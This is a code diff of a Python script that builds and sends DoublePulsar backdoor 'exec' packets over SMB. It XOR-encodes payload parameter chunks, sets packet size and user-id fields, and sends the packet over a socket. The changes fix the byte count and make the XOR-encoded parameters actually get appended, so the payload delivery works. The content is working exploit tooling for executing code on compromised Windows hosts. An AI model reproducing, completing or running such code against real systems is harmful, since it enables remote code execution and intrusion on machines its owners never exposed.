@@ -527,7 +527,7 @@ if __name__ == "__main__":
             # <I = Little Endian unsigned short
             TotalDataCount = struct.pack('<H', remainder)
             DataCount = struct.pack('<H', remainder)
-            ByteCount = struct.pack('<H', remainder + 13)
+            ByteCount = struct.pack('<H', remainder + 12)
 
             # last_payload_chunk = hex_bytes[Offset:remainder]
             # print(hexdump(last_payload_chunk))
@@ -545,7 +545,7 @@ if __name__ == "__main__":
             last_parameters += LastOffset
             last_parameters_bytearray = bytearray(last_parameters)
             print(hexdump(last_parameters_bytearray))
-            byte_xor(last_parameters_bytearray, byte_xor_key)
+            last_xor_parameters = byte_xor(last_parameters_bytearray, byte_xor_key)
             print(hexdump(last_parameters_bytearray))
 
             last_doublepulsar_exec_packet[39] = TotalDataCount[0]
@@ -563,7 +563,8 @@ if __name__ == "__main__":
             last_doublepulsar_exec_packet[32] = user_id[0]
             last_doublepulsar_exec_packet[33] = user_id[1]
 
-            last_doublepulsar_exec_packet += last_parameters_bytearray
+            #last_doublepulsar_exec_packet += last_parameters_bytearray
+            last_doublepulsar_exec_packet += last_xor_parameters
             last_doublepulsar_exec_packet += remainder_bytes
 
             s.send(last_doublepulsar_exec_packet)
